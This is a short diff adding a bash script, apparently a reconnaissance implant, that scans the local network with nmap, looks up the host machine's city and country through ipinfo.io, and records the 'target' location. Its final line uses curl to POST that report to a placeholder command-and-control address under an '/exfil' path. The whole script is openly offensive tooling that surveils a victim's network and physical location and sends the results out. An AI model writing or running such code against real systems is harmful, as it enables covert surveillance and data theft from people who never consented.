@@ -1,0 +1,15 @@
+#!/bin/bash
+
+# FING: Network Discovery
+echo "[+] Scanning local network..."
+NETWORK=$(ip route | grep default | awk '{print $3}' | cut -d'.' -f1-3)
+nmap -sn ${NETWORK}.0/24 -oN reports/network_scan.txt
+
+# GEOSPY: Geolocation
+echo "[+] Determining physical location..."
+LOCATION=$(curl -s ipinfo.io/city)
+COUNTRY=$(curl -s ipinfo.io/country)
+echo "Target is in $LOCATION, $COUNTRY" >> reports/geolocation.txt
+
+# Send results to C2
+curl -X POST -F "file=@reports/geolocation.txt" https://<C2-IP>/exfil/TARGET01
